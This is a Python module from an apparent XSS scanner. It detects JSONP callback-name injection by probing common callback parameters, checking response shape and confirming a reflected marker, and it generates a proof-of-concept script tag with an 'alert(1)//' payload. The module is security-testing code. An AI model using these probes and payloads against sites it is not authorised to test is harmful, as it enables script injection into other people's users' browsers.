"""JSONP callback XSS detection.

Many APIs return JSON wrapped in a callback function whose name is
user-controlled via a `callback=` / `jsonp=` / `cb=` query parameter:

  GET /api/users?callback=renderUsers
  -> renderUsers([{"id":1,"name":"alice"}, ...])

If the endpoint does not sanitize the callback name, an attacker can inject
arbitrary JS that executes when the response is loaded as <script src=...>:

  <script src="/api/users?callback=alert(1)//"></script>

This module:
  1. Probes common callback parameter names.
  2. Verifies the response is JSONP-shaped (starts with the callback name
     followed by `(`).
  3. Confirms callback-name injection by injecting a marker and checking
     that the response begins with `marker(`.
  4. Generates a PoC <script> tag that triggers the XSS.
"""
from __future__ import annotations
import re
from urllib.parse import urlencode

# Common callback parameter names seen in real-world APIs.
CALLBACK_PARAMS = [
    "callback", "jsonp", "cb", "cbfunc", "jsonpCallback",
    "jsonpCallbackName", "func", "function", "fn", "method",
    "action", "handler", "name", "_callback", "call", "cbf", "jcb",
]

# Marker used to confirm callback injection.  Must be a valid JS identifier
# prefix so the response stays syntactically valid as a <script>.
from .stealth import marker as _marker


def confirm_marker() -> str:
    """Lazy: evaluated per call so --marker-prefix applies after import."""
    return _marker("xssentinel_confirm_xss")


# Regex for a "JSONP-shaped" response: starts with a JS identifier followed
# by optional whitespace and `(`.
JSONP_SHAPE_RE = re.compile(
    r'^\s*([A-Za-z_$][\w$]*)\s*\(',
    re.MULTILINE,
)

# Disallowed callback chars (RFC).  If the endpoint accepts these, it's
# definitely not sanitizing -> exploitable.
DANGEROUS_CHARS = [";", "/", "<", ">", "!", "'", "\"", " ", "\t"]


def candidate_params() -> list[str]:
    """Return the list of callback parameter names to probe."""
    return list(CALLBACK_PARAMS)


def is_jsonp_response(response_text: str) -> bool:
    """Whether the response looks like JSONP (starts with `id(`)."""
    return bool(JSONP_SHAPE_RE.match(response_text or ""))


def extract_callback_name(response_text: str) -> str | None:
    """Extract the callback function name from a JSONP response."""
    m = JSONP_SHAPE_RE.match(response_text or "")
    return m.group(1) if m else None


def build_poc(url: str, callback_param: str, payload: str) -> str:
    """Build a PoC <script> tag that triggers the JSONP XSS."""
    sep = "&" if "?" in url else "?"
    poc_url = f"{url}{sep}{urlencode({callback_param: payload})}"
    return f'<script src="{poc_url}"></script>'


def analyze_response(response_text: str, marker: str) -> dict:
    """Analyze a single JSONP response.

    Returns: {
        "is_jsonp":        bool,
        "callback_name":   str | None,
        "marker_reflected": bool,   # marker present at the start of response
        "exploitable":     bool,   # is_jsonp AND marker_reflected at start
        "poc_payload":     str,    # the payload to use in the PoC URL
    }
    """
    is_j = is_jsonp_response(response_text)
    cb = extract_callback_name(response_text) if is_j else None
    reflected = marker in (response_text or "")
    # Truly exploitable: response starts with `marker(` -- meaning the
    # endpoint accepted our marker as the callback name and the response
    # will execute `marker(...)` when loaded as a script.
    exploitable = False
    if marker and response_text:
        pat = re.compile(r'^\s*' + re.escape(marker) + r'\s*\(',
                         re.MULTILINE)
        exploitable = bool(pat.match(response_text))
    # The PoC payload: `alert(1)//` is the classic; the comment swallows
    # the trailing `(json_data)` so the alert runs without a syntax error.
    poc = "alert(1)//"
    return {
        "is_jsonp": is_j,
        "callback_name": cb,
        "marker_reflected": reflected,
        "exploitable": exploitable,
        "poc_payload": poc,
    }


def dangerous_char_test(response_text: str, char: str) -> bool:
    """Check whether a dangerous character survived into the callback name.

    If yes, the endpoint does NO sanitization -> trivially exploitable.
    """
    return char in (response_text or "")
